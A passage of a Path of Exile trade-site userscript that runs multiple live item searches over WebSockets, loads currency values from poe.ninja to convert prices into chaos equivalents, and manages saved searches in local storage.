  var itemResultsPanel = _.find(app.$children, function(x) { return (x.$options._componentTag == "item-results-panel"); });
  itemResultsPanel.resetLiveSearch();
};
var resetConnections = function () {
  stopAllSockets();
  connections = {};
  $('.gs-style.live-search').remove();
};

var openMultiSearch = function(searches, names, live, quickFilters) {
  debug("MultiLive searches", searches);
  app.$store.commit("resetActiveUnreadHits", null);
  app.$store.commit("removeCurrentSearch", null);
  resetConnections();

  $('div.top ~ div.clear')
  .before(`
    <div class="gs-style alert-box live-search">
        Multi Live search: <span id="ms-console-holder"></span>
    </div>
  `);
  var closeLink = $('<a onclick="return false;">Close</a>');
  closeLink.on('click', function () {
    msConsoleStopped = true;
    app.$store.commit("clearSearchForm", true);
    app.$store.commit("setLiveSearchConnected", false);
    window.location = (""+window.location).replace(/^(.*(:?search|exchange)\/[^\/]+)\/(.*)$/,"$1");
    resetConnections();
  });
  $('#ms-console-holder').after(closeLink);
  closeLink.wrap('<span class="gs-pull-right">');
  setupMultiSearchConsole($('#ms-console-holder'), names);

  var fetches = [];
  var getDeferredSearchId = function(name, search, retry) {
    addQuickFilters(search, quickFilters);
    var deferred = $.Deferred();
    

    setTimeout(function(){
      var success = function(response) {
        response.search = search;
        debug("getDeferredSearchId.DONE FETCHING: "+name, response);
        deferred.resolve(response);
      };
      var failure = function(error) {
        if (retry > 0) {
          debug("getDeferredSearchId.FAIL FETCHING, RETRY " + retry + " - "+name, error);
          retry--;
          setTimeout(function(){
            var innerDeferred = getDeferredSearchId(name, search, retry);
            innerDeferred.done(success).fail(failure);
          }, 300);
        } else {
          debug("getDeferredSearchId.FAIL FETCHING: "+name, error);
          deferred.reject(error);
        }
      };
      var payload = (app.$store.state.persistent.tab == 'exchange') ? {
        exchange: search.query
      } : {
        query: search.query,
        sort: search.sort
      };
      app.$root.service[(app.$store.state.persistent.tab == 'exchange')?'performExchangeSearch':'performSearch'](search.league, payload, (new $.Deferred)
      .done(success)
      .fail(failure)
      .always(function() {
        debug("getDeferredSearchId.ALWAYS FETCHING: "+name, arguments);
      }));
    }, (4-retry)*300);
    return deferred;
  };

  var fixSearchParam = function(val) {
    if (val) {
      if (_.isArray(val) && val.length > 0) {
        return val[0];
      } else {
        return val;
      }
    } else {
      return null;
    }
  };

  $.each( searches, function( i, search ) {
    var s = {
      league: fixSearchParam(search.league),
      query: fixSearchParam(search.query),
      sort: fixSearchParam(search.sort)
    }
    fetches.push(function() {return getDeferredSearchId(names[i], s, 3);});
  });

  pacedWhen(fetches, {failureThreshold: 1, tick: getSetting('minimumRequestRate'), max: 1 })
  .done(function(resources) {
    debug("getDeferredSearchId.DONE ALL FETCHED: ", resources);
    msLiveUid = _.uniqueId('search_');
    var srcType = {type: "search", league: getCurrentLeague(), query: {status:{option:"any"},term:""+(new Date()).getTime(),stats:[{type:"and",filters:[]}]}};
    debug("setting search query to", srcType);
    app.$store.commit("addSearchQuery", {
        localId: msLiveUid,
        live: false,
        type: srcType.type,
        league: srcType.league,
        query: srcType.query,
        sort: {
            price: "asc"
        }
    });
    app.$store.commit("setSearchActive", {
        localId: msLiveUid
    });
    app.$store.commit("showAdvancedSearch", false);
    app.$store.commit("setLiveSearchStatus", "connected");
    addQuickFiltersMessage(quickFilters, function() {openMultiSearch(searches, names, live, {});});
    startAllSockets(resources);
  })
  .fail(function () {
    debug("getDeferredSearchId.FAIL ALL FETCHED: ", arguments);
    $.each( searches, function( i, search ) {
      socketStatus(i, "failed", "fetching");
    });
    app.$root.$refs.toastr.Add({
        msg: app.translate("Failed to get all search ids."),
        type: "error",
        progressbar: !1,
        timeout: 2e3
    });
  });
  close();
};

var startAllSockets = function (resources) {
  startLiveConsole();
  pacedWhen(resources.map(function(res, index) {
    return function() {
      var deferred = $.Deferred();
      var connection = startSocket(index, res);
      deferred.resolve(connection);
      return deferred;
    }
  }), {failureThreshold: 1, tick: getSetting('minimumRequestRate'), max: 1 })
  .done(function(conns) {
    debug("all connections launched", conns);
  })
  .fail(function () {
    debug("connections start failed", arguments);
  });
};

var startSocket = function(index, res) {
  if (res) {
    fetchedSocket(index, res);
    var connection, failed = true;
    try {
      connection = new WebSocket("wss://" + location.host + "/api/trade/live/" + res.search.league + "/" + res.id);
    } catch(e) {
      failed = true;
    }

    connection.onopen = function(event) {
      // e.$store.commit("setLiveSearchConnected", !0)
      debug("WS - Opened connection to: "+res, event);
      socketStatus(index, "connected");
    };
    connection.onmessage = function(r) {
      failed = false;
      debug("WS - message from:" + res, r);
      socketStatus(index, "working");
      var n = JSON.parse(r.data);
      log(n);
      if (n.new) {
        n = n.new;
        var s = _.uniqueId("result_");
        app.$store.commit("addSearchResult", {
          localId: msLiveUid,
          resultId: s,
          id: res.id,
          result: n,
          total: n.length
        }), app.$root.notify(n.length), app.$store.commit("incrementActiveUnreadHits")
      }
    };
    connection.onclose = function(event) {
      // e.$store.commit("setLiveSearchConnected", !1), e.connection = null
      socketStatus(index, failed ? "failed" : "stopped", failed ? "connecting - might be a search for an old league" : "");
      warn("WS - Error from: "+res, event);
    };
    connections[index] = connection;
    return connection;
  } else {
    socketStatus(index, "failed", "fetching");
    return null;
  }
};

  var leagues = [], currencies, isCurr, ASC = true, DESC = false;

var _initPageOrig = initPage;
initPage = function(loc) {
  isCurr = isCurrencySearch(loc);
  $(document).on(`setting-frame-frame-open`, function() {
    $('#setting-frame').contents().find('#settings')
    .toggleClass("currencySettings", isCurr)
    .toggleClass("itemSettings", !isCurr);
  });
  _initPageOrig.apply(this, arguments);
};

function isItemSearch(url) {
   return /^[^\.]*poe\.trade\/?.*/.test(url);
}
function isCurrencySearch(url) {
  debug(url, "isCurrencySearch");
   return /^.*currency\.poe\.trade\/?.*/.test(url);
}
function isPoeOfficialItemSearch(url) {
   return /^[^\.]*www\.pathofexile\.com\/trade\/search\/?.*/.test(url);
}

function resetCurrency(league) {
  if (league) {
    var curr = JSON.parse(localStorage.getItem(namespace+".currencies"));
    delete curr[league];
    localStorage.setItem(namespace+".currencies", JSON.stringify(curr));
  } else {
    localStorage.setItem(namespace+".fixedCurrenciesChanges", JSON.stringify({}));
  }
};

function setCurrencyValue(league, key, value) {
  if (league) {
    var curr = JSON.parse(localStorage.getItem(namespace+".currencies"));
    if (!curr[league].map[key].originalChaosEquiv) {
      curr[league].map[key].originalChaosEquiv = curr[league].map[key].chaosEquivalent;
    }
    curr[league].map[key].chaosEquivalent = value;
    if (curr[league].map[key].originalChaosEquiv === curr[league].map[key].chaosEquivalent) {
      delete curr[league].map[key].originalChaosEquiv;
    }
    localStorage.setItem(namespace+".currencies", JSON.stringify(curr));
  } else {
    var changes = JSON.parse(localStorage.getItem(namespace+".fixedCurrenciesChanges")) || {};
    changes[key] = value;
    if (changes[key] == FIXED_CURRENCY_VALUES.map[key].chaosEquivalent) {
      delete changes[key];
    }
    localStorage.setItem(namespace+".fixedCurrenciesChanges", JSON.stringify(changes));
  }
};

function getCurrencies(league, cb) {
  var doLoadCurrencies = getSetting('enableCurrencyLoad');
  if (doLoadCurrencies) {
    var updated, leaguesToRemove = [], curr = JSON.parse(localStorage.getItem(namespace+".currencies"));
    if (leagues) {
      $.each( curr, function( ll, value ) {
        if (!leagues.find(function(x) {
          return x == ll;
        })) {
          leaguesToRemove.push(ll);
        }
      });
      if (leaguesToRemove.length > 0) {
        $.each( leaguesToRemove, function( i, ll ) {
          delete curr[ll];
        });
        localStorage.setItem(namespace+".currencies", JSON.stringify(curr));
      }
    }
    debug(curr, "curr from localstorage");
    if (curr) curr = curr[league];
    debug(curr, "curr of ["+league+"] from localstorage");
    if (curr && curr.updated) updated = moment(curr.updated);
    var maxAge = getSetting('currencyMaxAge');
    if (!curr || !updated || (maxAge > 0 && moment.duration(moment().diff(updated)).asHours() >= maxAge)) {
      debug('currencies from poe.ninja not found in session or older then '+maxAge+' hours');
      var getDeferred = function(url) {
        var deferred = $.Deferred();
        GM_xmlhttpRequest({
          method: "GET",
          url: url,
          onload: function (response) {
            deferred.resolve(response);
          },
          onerror: function (error) {
            deferred.fail(error);
            debug(error);
          }
        });
        return deferred;
      };
      $.when(
        getDeferred("https://poe.ninja/api/data/currencyoverview?league="+league+"&type=Currency&date="+moment().format("YYYY-MM-DD")),
        getDeferred("https://poe.ninja/api/data/currencyoverview?league="+league+"&type=Fragment&date="+moment().format("YYYY-MM-DD")),
        getDeferred("https://poe.ninja/api/data/itemoverview?league="+league+"&type=Scarab&date="+moment().format("YYYY-MM-DD"))
      ).then(function () {
        curr = {map: {}, lines: [], currencyDetails: []};
        $.each( arguments, function( i, response ) {
          debug("GM_xmlhttpRequest response", response);
          if (response.responseText) {
            var c = JSON.parse(response.responseText);
            curr.updated = moment().valueOf();
            if (c.currencyDetails) {
              curr.currencyDetails = _.uniqBy(curr.currencyDetails.concat(c.currencyDetails), 'id');
            }
            if (c.lines) {
              curr.lines = _.uniqBy(curr.lines.concat(_.map(c.lines, function(x) {
                if (!x.currencyTypeName) {
                  x.currencyTypeName = x.name;
                }
                if (!x.chaosEquivalent) {
                  x.chaosEquivalent = x.chaosValue;
                }
                return x;
              })), 'currencyTypeName');
            }
          } else {
            console.log("unable to load Poe.Ninja values for league: "+league);
            debug(response);
          }
        });
        if (curr.lines.length > 0) {
          $.each(curr.lines, function( index, val ) {
            curr.map[_.kebabCase(val.currencyTypeName)] = val;
            if (val.currencyTypeName == "Timeless Eternal Emblem") {
              var clone = $.extend({}, val);
              clone.currencyTypeName == "Timeless Eternal Empire Emblem"
              curr.map[_.kebabCase(clone.currencyTypeName)] = clone;
            }
          });
          var sets = [
            {set:"Shaper Set", fragments:["fragment-of-the-chimera","fragment-of-the-hydra","fragment-of-the-minotaur","fragment-of-the-phoenix"]},
            {set:"Pale Court Set", fragments:["volkuurs-key","yriels-key","inyas-key","ebers-key"]},
            {set:"Mortal Set", fragments:["mortal-grief","mortal-hope","mortal-ignorance","mortal-rage"]},
            {set:"Sacrifice Set", fragments:["sacrifice-at-dawn","sacrifice-at-dusk","sacrifice-at-midnight","sacrifice-at-noon"]}
          ];
          $.each( sets, function( i, set ) {
            if (set.fragments.length == set.fragments.filter(function(x) {return curr.map[x];}).length) {
              var sum = 0;
              $.each( set.fragments, function( j, fragment ) {
                sum += curr.map[fragment].chaosEquivalent;
              });
              var setObject = {
                currencyTypeName: set.set,
                chaosEquivalent: (Math.round(sum*100)/100)
              };
              curr.map[_.kebabCase(set.set)] = setObject;
              curr.lines.push(setObject);
            }
          });
          curr.lines = curr.lines.sort(function(a, b) {
            return b.chaosEquivalent - a.chaosEquivalent;
          });
          debug(curr, "currencies from poe.ninja");
          var ccc = JSON.parse(localStorage.getItem(namespace+".currencies"));
          if (!ccc) ccc = {};
          ccc[league] = curr;
          var toDelete = [];
          $.each( ccc, function( k, v ) {
            if ( !v.updated || (maxAge > 0 && moment.duration(moment().diff(v.updated)).asHours() >= maxAge) ) {
              toDelete.push(k);
            }
          });
          $.each( toDelete, function( i, k ) {
            delete ccc[k];
          });
          localStorage.setItem(namespace+".currencies", JSON.stringify(ccc));
          cb(curr);
        } else {
          cb(null);
        }
      },function () {
        console.log("unable to load Poe.Ninja values");
        debug("GM_xmlhttpRequest errors", arguments);
        cb(null);
      });
    } else {
      debug(curr, "currencies taken from browser session");
      cb(curr);
    }
  } else {
    var changes = JSON.parse(localStorage.getItem(namespace+".fixedCurrenciesChanges")) || {};
    var curr = $.extend( true, {}, FIXED_CURRENCY_VALUES );
    $.each( changes, function( key, value ) {
      curr.map[key].originalChaosEquiv = curr.map[key].chaosEquivalent;
      curr.map[key].chaosEquivalent = value;
    });
    cb(curr);
  }
}

function initCurrencyTables(iframe) {
  var generateCurrencyTable = function(l, lid) {
    var tbl = $(`<table id="curr-table-${lid}" class="table table-sm table-hover curr-table">
      <thead>
        <tr>
          <th scope="col">Currency</th>
          <th scope="col">Chaos equivalent</th>
        </tr>
      </thead>
      <tbody>
      </tbody>
    </table>`);
    iframe.contents().find(`#${lid}-pane`).empty().append(tbl);
    var tbody = iframe.contents().find(`#curr-table-${lid} tbody`);
    getCurrencies(l, function(curr) {
      if (curr && curr.map && curr.lines) {
        $.each( curr.lines, function( i, value ) {
          var details = curr.currencyDetails.find(function(x) {
            return x.name === value.currencyTypeName;
          });
          var key = _.kebabCase(value.currencyTypeName);
          tbody.append(`<tr>
            <td><img src="${((details && details.icon) ? details.icon : value.icon)}" /> ${value.currencyTypeName}</td>
            <td><span id="${lid}-${value.detailsId}">${value.chaosEquivalent}</span>${((value.originalChaosEquiv) ? ' <span title="original value was '+value.originalChaosEquiv+'"><i class="fas fa-exclamation-triangle"></i></span>' : "")}</td>
          </tr>`);
          iframe.contents().find(`#${lid}-${value.detailsId}`).editable("click", function(e) {
            setCurrencyValue(l, key, Number(e.value));
            generateCurrencyTable(l, lid);
          });
        });
        if (l) {
          iframe.contents().find(`#${lid}-pane`).prepend(`<p>Last update at ${moment(curr.updated).format("HH:mm")} - ${(getSetting('currencyMaxAge')>0) ? "Values will be refreshed after "+moment(curr.updated).add(getSetting('currencyMaxAge'), 'h').format("HH:mm") : "Max age set to 0, can only be refreshed manually"} - </p>`);
        } else {
          iframe.contents().find(`#${lid}-pane`).prepend(`<p></p>`);
        }
        var refreshButton = $(`<a href="#" onclick="return false;">${((l) ? 'refresh now' : 'reset all values')}</a>`);
        refreshButton.on('click', function(e) {
          e.preventDefault();
          resetCurrency(l);
          generateCurrencyTable(l, lid);
        });
        iframe.contents().find(`#${lid}-pane p:first`).append(refreshButton);
      } else {
        iframe.contents().find(`#${lid}-pane`).empty().append(`<div class="alert alert-warning" role="alert">Unable to load currency values from poe.ninja for league ${l}</div>`);
      }
    });
  };

  if (getSetting('enableCurrencyLoad')) {
    iframe.contents().find('#preloaded-tab').addClass('disabled');
    iframe.contents().find('#leagues-tab,.preloaded-info').addClass('d-none');
    iframe.contents().find('.loaded-info').removeClass('d-none');
    iframe.contents().find('#preloaded-pane').removeClass('show active');
    $.each( leagues, function( i, l ) {
      var lid = _.kebabCase(l);
      if (iframe.contents().find(`#${lid}-tab`).length === 0) {
        iframe.contents().find('#myCurrTab').append(`<li class="nav-item">
          <a class="nav-link" id="${lid}-tab" data-toggle="tab" href="#${lid}-pane" onclick="return false;" role="tab" aria-controls="${lid}-pane" aria-selected="false">${l}</a>
        </li>`);
        iframe.contents().find('#myCurrTabContent').append(`<div class="tab-pane fade" id="${lid}-pane" role="tabpanel" aria-labelledby="${lid}-tab">
          ${l} Tab
        </div>`);
      }
      iframe.contents().find(`#${lid}-tab`).on('click', function() {
        generateCurrencyTable(l, lid);
      });
    });
    iframe.contents().find(`#currency .tab-pane,#currency .nav-link`).removeClass('show active');
    iframe.contents().find(`#${_.kebabCase(getCurrentLeague())}-tab`).addClass('active').click();
    iframe.contents().find(`#${_.kebabCase(getCurrentLeague())}-pane`).addClass('show active');
  } else {
    iframe.contents().find('#preloaded-tab').removeClass('disabled');
    iframe.contents().find('#leagues-tab,.preloaded-info').removeClass('d-none');
    iframe.contents().find('.loaded-info').addClass('d-none');
    iframe.contents().find('#preloaded-pane').addClass('show active');
    iframe.contents().find('#currency .tab-pane:not(#leagues-pane):not(#preloaded-pane)').remove();
    iframe.contents().find('#currency .nav-link:not(#leagues-tab):not(#preloaded-tab)').remove();
    iframe.contents().find(`#currency .tab-pane,#currency .nav-link`).removeClass('show active');
    iframe.contents().find(`#preloaded-tab`).on('click', function() {
      generateCurrencyTable(null, "preloaded");
    });
    iframe.contents().find(`#preloaded-tab`).addClass('active').click();
    iframe.contents().find(`#preloaded-pane`).addClass('show active');
  }
  var c = JSON.parse(localStorage.getItem(namespace+".currencies"));
};

//function override
  function update_offer_numbers(y) {
    var x = y || $("#contactrange").val();
    current_offer.totalwant = x * current_offer.sellvalue;
    current_offer.totalhave = x * current_offer.buyvalue;
    $("#contactbuyval").text(current_offer.totalwant);
    $("#contactsellval").text(current_offer.totalhave);
    var msg = "@" + current_offer.ign + " Hi, I'd like to buy your " + current_offer.totalwant + " " + CURRENCY_TEXTS[current_offer.sellcurrency] + " for my " + current_offer.totalhave + " " + CURRENCY_TEXTS[current_offer.buycurrency] + " in "+getCurrentLeague()+".";
    $("#contacttext").text(msg);
    if (current_offer.stock && current_offer.totalwant > current_offer.stock) {
      $("#stockproblem").text("Unfortunate issue! " + current_offer.username + " only has " + current_offer.stock + " " + CURRENCY_TEXTS[current_offer.sellcurrency] + ". And you're asking for " + current_offer.totalwant + ".");
      $("#stockproblem").show();
    } else {
      $("#stockproblem").hide();
    }
  }

  function separateBuyout(buyout) {
    var match = /^([\d\.]+)\s(\w+.*)$/.exec(buyout);
    if (match && match.length == 3) {
      return [Number(match[1]), match[2]];
    } else {
      debug(match, "Buyout not separated");
      return null;
    }
  }

  function translateCurrency(curr) {
    switch (curr.toLowerCase()) {
      case "chaos":
      return "Chaos Orb";
      break;
      case "gemcutter":
      case "gcp":
      return "Gemcutter's Prism";
      break;
      case "fuse":
      case "fusing":
      return "Orb of Fusing";
      break;
      case "alch":
      case "alchemy":
      return "Orb of Alchemy";
      break;
      case "chrom":
      case "chrome":
      case "chromatic":
      return "Chromatic Orb";
      break;
      case "alt":
      case "alteration":
      return "Orb of Alteration";
      break;
      case "augmentation":
      return "Orb of Augmentation";
      break;
      case "jew":
      case "jewel":
      case "jeweller":
      case "jewellers":
      case "jeweller's":
      return "Jeweller's Orb";
      break;
      case "chance":
      return "Orb of Chance";
      break;
      case "wisdom":
      return "Scroll of Wisdom";
      break;
      case "chisel":
      case "cartographer":
      return "Cartographer's Chisel";
      break;
      case "scour":
      case "scouring":
      case "souring":
      return "Orb of Scouring";
      break;
      case "blessed":
      return "Blessed Orb";
      break;
      case "regret":
      return "Orb of Regret";
      break;
      case "regal":
      return "Regal Orb";
      break;
      case "divine":
      return "Divine Orb";
      break;
      case "exalted":
      case "exa":
      return "Exalted Orb";
      break;
      case "mir":
      case "mirror":
      return "Mirror of Kalandra";
      break;
      case "perandus":
      return "Perandus Coin";
      break;
      case "silver":
      return "Silver Coin";
      break;
      case "vaal":
      return "Vaal Orb";
      break;
      case "apprentice sextant":
      return "Apprentice Cartographer's Sextant";
      break;
      case "offering":
      return "Offering To The Goddess";
      break;
      case "hydra":
      case "minotaur":
      case "phoenix":
      case "chimera":
      return _.startCase("Fragment Of The " + curr);
      break;
      case "ignorance":
      case "grief":
      case "hope":
      case "rage":
      return _.startCase("Mortal " + curr);
      break;
      case "dusk":
      case "midnight":
      case "dawn":
      case "noon":
      return _.startCase("Sacrifice at " + curr);
      break;
      case "volkuur's":
      case "eber's":
      case "yriel's":
      case "inya's":
      return _.startCase(curr + " Key");
      break;
      default:
      if (currencies.map[_.kebabCase(curr)]) {
        return _.startCase(curr);
      } else {
        debug("WARNING: Can't find currency '"+curr+"'", currencies);
        return null;
      }
      break;
    }
  }

  function translateCurrencySafe(curr) {
    var t = curr;
    try {
      t = translateCurrency(curr);
    } catch(ex) {}
    return t || curr;
  }

  function getEssenceTier(name) {
    switch (name.toLowerCase()) {
      case "whispering":
      return 1;
      break;
      case "muttering":
      return 2;
      break;
      case "weeping":
      return 3;
      break;
      case "wailing":
      return 4;
      break;
      case "screaming":
      return 5;
      break;
      case "shrieking":
      return 6;
      break;
      case "deafening":
      return 7;
      break;
      default:
      throw new Error("Can't find EssenceTier '"+name+"'");
      break;
    }
  }

  function getSextantTier(name) {
    switch (name.toLowerCase()) {
      case "apprentice":
      return 1;
      break;
      case "journeyman":
      return 2;
      break;
      case "master":
      return 3;
      break;
      default:
      throw new Error("Can't find SextantTier '"+name+"'");
      break;
    }
  }

  function convertBuyout(buyout, forceQuantity) {
    var b = separateBuyout(buyout);
    if (b) {
      try {
        var curr = translateCurrency(b[1]);
        var quantity = ((forceQuantity) ? forceQuantity : b[0]);
        if (!curr) {
          return 0;
        } else if (curr == "Chaos Orb") {
          return Number(quantity);
        } else {
          if (!currencies.map[_.kebabCase(curr)]) {
            throw new Error("Can't find '"+curr+"' in poe.ninja's values");
          }
          return Number(quantity) * currencies.map[_.kebabCase(curr)].chaosEquivalent;
        }
      } catch( ex ) {
        console.log(ex);
        return 0;
      }
    } else {
      debug("Buyout not separated");
      return 0;
    }
  }

  function convertBuyoutWithRest(buyout) {
    var b = separateBuyout(buyout);
    if (b) {
      try {
        var curr = translateCurrency(b[1]);
        var quantity = b[0];
        if (!curr) {
          return null;
        } else if (curr == "Chaos Orb") {
          return null;
        } else {
          if (!currencies.map[_.kebabCase(curr)]) {
            throw new Error("Can't find '"+curr+"' in poe.ninja's values");
          }
          var cEq = currencies.map[_.kebabCase(curr)].chaosEquivalent;
          var rest = ((cEq > 1) ? quantity % 1 : 0);
          if (rest > 0) {
            var result = {integ: Math.floor(quantity), rest: rest, curr: curr, chaosEquivalent: cEq};
            if (quantity % 1 >= 0.5) {
              result.buyWithRest = (1 - (quantity % 1));
            }
            return result;
          } else {
            return null;
          }
        }
      } catch( ex ) {
        console.log(ex);
        return null;
      }
    } else {
      debug("Buyout not separated");
      return [];
    }
  }

  function getCurrency(buyout) {
    var b = separateBuyout(buyout);
    if (b) {
      try {
        var curr = translateCurrency(b[1]);
        if (!curr) {
          return b[1];
        } else {
          return curr;
        }
      } catch( ex ) {
        console.log(ex);
        return null;
      }
    } else {
      debug("Buyout not separated");
      return null;
    }
  }

  function endsWithOneOf(str, list) {
    var re = new RegExp("\\s("+list.join("|")+")$","i");
    var match = re.exec(str);
    if (match && match.length > 0) {
      return match[1];
    }
    return null;
  }

  function getTier(name) {
    var tierName, match = /^(Whispering|Muttering|Weeping|Wailing|Screaming|Shrieking|Deafening) Essence of/.exec(name);
    if (match && match.length == 2) {
      tierName = match[1];
      return [getEssenceTier(tierName), 7];
    }
    match = /^(Journeyman|Apprentice|Master) Cartographer's Sextant/.exec(name);
    if (match && match.length == 2) {
      tierName = match[1];
      return [getSextantTier(tierName), 3];
    }
    return [];
  }

  function getChaosEquivTip(buyout, currency, lastCharacterName) {
    var sellOneValue = convertBuyout(buyout, 1);
    var withRest = convertBuyoutWithRest(buyout);
    var tip = $(`<div>
      <small class="${currency == 'Chaos Orb' ? 'hide' : ''}">1 ${currency} = ${(Math.round(sellOneValue*100)/100)} chaos / 1 chaos = ${(Math.round((1/sellOneValue)*10000)/10000)} ${currency}</small>
      <br class="${currency == 'Chaos Orb' ? 'hide' : ''}" />
      <small class="${withRest === null ? 'hide' : 'bold'}">${((withRest) ? withRest.integ : "")} ${currency} + ${((withRest) ? (Math.round((withRest.rest*withRest.chaosEquivalent)*100)/100) : "")} chaos</small>
      <br class="${withRest === null ? 'hide' : ''}" />
      click to sort for current poe.ninja values</div>`);
    if (withRest && withRest.buyWithRest && lastCharacterName) {
      var spn = $('<a href="#" class="nowrap">ask to buy with rest</a>');
      tip.find("br").last()
      .after("<br />")
      .after(spn);

      spn.on('click', function(e) {
        e.preventDefault();
        copyToClipboard(`@${lastCharacterName} can I pay ${withRest.integ + 1} ${currency} and receive the rest of ${Math.floor(withRest.buyWithRest*withRest.chaosEquivalent)} chaos?`);
      });
    }

    return tip;
  }

  function getCurrencyChaosEquivTip(tot, cada, sellcurrency, buycurrency) {
    var sellOneValue = convertBuyout("1 "+sellcurrency);
    var buyOneValue = convertBuyout("1 "+buycurrency);
    var translated = translateCurrencySafe(sellcurrency);
    var buycurrTranslated = translateCurrencySafe(buycurrency);
    var tip = $(`<div>1 ${translated} for ${(Math.round(cada*100000)/100000)} chaos
      <br />total trade value ${(Math.round(tot*100)/100)} chaos
      <br /><small>calculated using current poe.ninja values:</small>
      <br class="${translated == 'Chaos Orb' ? 'hide' : ''}" /><small class="${translated == 'Chaos Orb' ? 'hide' : ''}">1 ${translated} = ${(Math.round(sellOneValue*100)/100)} chaos / 1 chaos = ${(Math.round((1/sellOneValue)*10000)/10000)} ${translated}</small>
      <br class="${buycurrTranslated == 'Chaos Orb' ? 'hide' : ''}" /><small class="${buycurrTranslated == 'Chaos Orb' ? 'hide' : ''}">1 ${buycurrTranslated} = ${(Math.round(buyOneValue*100)/100)} chaos / 1 chaos = ${(Math.round((1/buyOneValue)*10000)/10000)} ${buycurrTranslated}</small>
      <br />click to sort for current poe.ninja values</div>`);
    return tip;
  }

  var searchesKey = "gs-poetrade-searches";
var saveIcon, loadIcon, multiIcon;
var saveFrame, loadFrame, multiFrame;
var saveManagerInitialized = false;
var close = function() {
  closeFrame('save-frame');
  closeFrame('load-frame');
  closeFrame('multi-frame');
};

/**
* Updates a key/valueArray with the given property and value. Values will always be stored as arrays.
*
* @param prop The property to add the value to.
* @param value The value to add.
* @param obj The object to update.
* @returns {object} Updated object.
*/
function updateKeyValueArray( prop, value, obj ) {
  var current = obj[ prop ];

  if ( current === undefined ) {
    obj[ prop ] = [ value ];

  } else {
    current.push( value );
  }

  return obj;
}

/**
* Normalize the provided data into a key/valueArray store.
*
* @param data The data provided by the user to the plugin.
* @returns {object} The data normalized into a key/valueArray store.
*/
function deserialize( data ) {
  var normalized = {};
  var rPlus = /\+/g;

  // Convert data from .serializeObject() notation
  if ( $.isPlainObject( data ) ) {
    $.extend( normalized, data );

    // Convert non-array values into an array
    $.each( normalized, function( name, value ) {
      if ( !$.isArray( value ) ) {
        normalized[ name ] = [ value ];
      }
    });

    // Convert data from .serializeArray() notation
  } else if ( $.isArray( data ) ) {
    $.each( data, function( index, field ) {
      updateKeyValueArray( field.name, field.value, normalized );
    });

    // Convert data from .serialize() notation
  } else if ( typeof data === "string" ) {
    $.each( data.split( "&" ), function( index, field ) {
      var current = field.split( "=" );
      var name = decodeURIComponent( current[ 0 ].replace( rPlus, "%20" ) );
      var value = decodeURIComponent( current[ 1 ].replace( rPlus, "%20" ) );
      updateKeyValueArray( name, value, normalized );
    });
  }

  return normalized;
}

function serialize( data ) {
  var pairs = _.toPairs(data);
  var toJoin = [];
  for (var i = 1; pairs.filter(function(x){ return x.length > 1 && x[1].length >= i}).length > 0; i++) {
    var filteredPairs = pairs.filter(function(x){ return x.length > 1 && x[1].length >= i});
    for (var n = 0; n < filteredPairs.length; n++) {
      if (filteredPairs[n].length == 2) {
        toJoin.push(filteredPairs[n][0] + "=" + filteredPairs[n][1][i-1]);
      }
    }
  }
  return toJoin.join("&");
}

var getSearchProperties = function() {
  var searches = localStorage.getItem(getSearchKey()+"-colors");
  if (!searches) {
    searches = {};
  } else {
    searches = JSON.parse(searches);
  }
  return searches;
};
var putSearchProperties = function(searches) {
  localStorage.setItem(getSearchKey()+"-colors", JSON.stringify(searches));
};
var getSearches = function() {
  var searches = localStorage.getItem(getSearchKey());
  if (!searches) {
    searches = {};
  } else {
    searches = JSON.parse(searches);
  }
  return searches;
};
var putSearches = function(searches) {
  localStorage.setItem(getSearchKey(), JSON.stringify(searches));
};
var renameSearch = function(oldName, newName) {
  if (oldName !== newName) {
    var searches = getSearches();
    Object.defineProperty(searches, newName, Object.getOwnPropertyDescriptor(searches, oldName));
    delete searches[oldName];
    putSearches(searches);
    loadSearches();
  }
};
var colorSearch = function(name, color) {
  var searches = getSearchProperties();
  if (!searches[name]) {
    searches[name] = {};
  }
  searches[name].color = color;
  putSearchProperties(searches);
};
var deleteSearch = function(name) {
  var searches = getSearches();
  if (searches[name]) {
    delete searches[name];
    putSearches(searches);
  }
};

var importSearch = function(text, overwrite) {
  debug(text);
  debug(overwrite);
  try {
    var newSearches = JSON.parse(text);
    if (typeof newSearches !== "object") {
      throw new Error("Imported JSON not a JS object");
    }
    var searches = overwrite ? {} : getSearches();
    $.each( Object.keys(newSearches), function( i, k ) {
      searches[k] = newSearches[k];
    });
    putSearches(searches);
    loadSearches();
  } catch(ex) {
    console.log(ex.message);
    loadFrame.contents().find('div.row').first().append(/*html*/`
      <dic class="col-md-12 py-2">
        <div class="alert alert-danger" role="alert">
          <h4 class="alert-heading">Error</h4>
          <p>An error prevented PTE from importing your searches.</p>
        </div>
      </div>
    `);
  }
  // if (oldName !== newName) {
  //   var searches = getSearches();
  //   Object.defineProperty(searches, newName, Object.getOwnPropertyDescriptor(searches, oldName));
  //   delete searches[oldName];
  //   putSearches(searches);
  //   loadSearches();
  // }

};

var loadTypeaheadSearches = function() {
  debug("typeahead");
  $("#searchName", saveFrame[0].contentWindow.document).typeahead('destroy');
  $("#searchName", saveFrame[0].contentWindow.document).typeahead({
    source: Object.keys(getSearches()).sort(),
    item: '<li class="dropdown-item"><a class="dropdown-item" href="#" role="option"></a></li>',
    autoSelect: false
  });
};

var checkMultiSelected = function () {
  multiFrame.contents().find('#multi-live').prop('disabled', $("#search-list .form-check-input:checked", multiFrame[0].contentWindow.document).length === 0);
}

var loadMultiSearches = function(retryed) {
  //TODO: text for no results
  //TODO: filter list by other meta data
  //TODO: tooltip significant search params
  multiFrame.contents().find('#search-list').empty();

  var searches = getSearches();
  var lastMulti = getSetting("last-multiLive");

  $.each( Object.keys(searches).sort(), function( i, k ) {
    debug(`loading search ${i} - ${k}`);
    var row = $(`<tr></tr>`);
    row.data("name", k);
    row.data("params", deserialize(searches[k]));

    var chk = $(`<div class="form-check">
  <input class="form-check-input" type="checkbox" value="" id="${k}"${((lastMulti && lastMulti.indexOf(k)>=0)?' checked':'')}>
  <label class="form-check-label" for="${k}">
    ${k}
  </label>
</div>`);
    row.append(chk);
    chk.wrap('<td>');

    multiFrame.contents().find('#search-list').append(row);
  });
  if (Object.keys(searches).length <= 0) {
    multiFrame.contents().find('#no-searches-alert').removeClass("d-none");
  } else {
    multiFrame.contents().find('#no-searches-alert').addClass("d-none");
  }

  $("#search-list .form-check-input", multiFrame[0].contentWindow.document).on('change', checkMultiSelected);
  checkMultiSelected();
  setupSearchAdditions(multiFrame);

  if (!retryed && Object.keys(searches).length > 0 && multiFrame.contents().find('#search-list tr').length === 0) {
